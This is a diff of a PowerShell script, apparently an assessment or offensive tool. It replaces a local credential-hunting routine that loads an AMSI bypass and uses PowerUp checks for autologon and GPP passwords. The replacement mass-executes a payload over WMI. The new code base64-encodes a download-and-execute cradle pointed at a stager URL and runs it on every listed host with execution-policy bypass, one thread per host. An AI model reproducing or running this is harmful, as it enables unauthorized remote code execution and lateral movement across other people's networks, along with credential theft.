@@ -1,71 +1,52 @@
-function Invoke-Windows{
-    Start-Transcript -Path "$(Get-Location)\$env:COMPUTERNAME.txt" -NoClobber
+#Multi Threading :D
+#Install-Module -Name PoshRSJob -Force
+#maybe need manually import of wmiexec
+. .\WmiExec.ps1
+function Invoke-WindowsWMI{
+    param (
+        [Parameter(Position=0,ValueFromPipeline=$True)]
+        $Computers = ".\windows.txt",
+        
+        [Parameter(Mandatory=$true)]
+        $StagerUrl
+    )
+    #Import ComputerNames
+    if($Computers.GetType().name -like 'String'){
+        $Computers = Get-Content $Computers -ErrorAction Stop
+    }
+    #Import dependencies
     try{
-        . $PSScriptRoot\ASBBypass.ps1 | Out-Null
-        . $PSScriptRoot\PowerUp.ps1
+        Import-Module PoshRSJob
+        . $PSScriptRoot\WmiExec.ps1
     }catch{
         Write-Output "[-] $($_.Exception.Message)"
         return
     }
-    Write-Host "[*] ComputerName $env:COMPUTERNAME"
-    Write-Host "[*] User $env:USERNAME"
-    Write-Host "[*] UserDomain $env:USERDOMAIN"
-
-    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-RegistryAutoLogon/
-    Write-Host "`n[*] Checking AutoLogon"
-    try{
-        $autologon=Get-RegistryAutoLogon
-        if($autologon){
-            Write-Host "[-] AutoLogon Credentials Found" -ForegroundColor Red
-            $autologon
-        }else{
-            Write-Host "[+] No AutoLogon Credentials Found" -ForegroundColor Green
-        }
-    }catch{
-        Write-Host "[-] AutoLogon Failed" -ForegroundColor Red
+    #Create output folder
+    $OutputFolder = "$((Get-Location).path)\windows"
+    if(-not(Test-Path $OutputFolder)){
+        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
     }
-
-    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-CachedGPPPassword/
-    Write-Host "`n[*] Checking CachedGPPPassword"
-    try{
-        $CachedGPPPassword=Get-CachedGPPPassword
-        if($CachedGPPPassword){
-            Write-Host "[-] CachedGPPPassword Found" -ForegroundColor Red
-            $CachedGPPPassword
-        }else{
-            Write-Host "[+] No CachedGPPPassword Found" -ForegroundColor Green
-        }
-    }catch{
-        Write-Host "[-] CachedGPPPassword Failed" -ForegroundColor Red
+    #Args
+    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (new-object net.webclient).downloadstring('$stagerurl')"))
+    $ScriptParams = @{
+        'Location' = $OutputFolder
+        'StagerUrl' = $Enc
     }
-
-    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnattendedInstallFile/
-    Write-Host "`n[*] Checking UnattendedInstallFiles"
-    try{
-        $UnattendedInstallFile=Get-UnattendedInstallFile
-        if($UnattendedInstallFile){
-            Write-Host "[-] UnattendedInstallFiles Found" -ForegroundColor Red
-            $UnattendedInstallFile
-        }else{
-            Write-Host "[+] No UnattendedInstallFiles Found" -ForegroundColor Green
-        }
-    }catch{
-        Write-Host "[-] UnattendedInstallFiles Failed" -ForegroundColor Red
+    #One thread for every computer :D
+    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
+    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad Invoke-WMIExec -ScriptBlock {
+            param($Inputargs)
+            $Location = $Inputargs.Location
+            $StagerUrl = $Inputargs.StagerUrl
+            Start-Transcript -Path "$Location\$($_)"
+            Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $StagerUrl"
+            Stop-Transcript
+    } | Wait-RSJob -ShowProgress
+    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
+    if($errors){
+        Write-Host "[-] Failed connecting to following hosts" -ForegroundColor Red
+        Write-Output $errors
     }
-
-    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnquotedService/
-    Write-Host "`n[*] Checking Unquoted Services"
-    try{
-        $UnquotedService=Get-UnquotedService
-        if($UnquotedService){
-            Write-Host "[-] Unquoted Services Found" -ForegroundColor Red
-            $UnquotedService
-        }else{
-            Write-Host "[+] No Unquoted Services Found" -ForegroundColor Green
-        }
-    }catch{
-        Write-Host "[-] Unquoted Services Failed" -ForegroundColor Red
-    }
-    Stop-Transcript
 }
-#Invoke-Windows
+#Invoke-WindowsWMI -stagerurl 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/chaps.ps1'
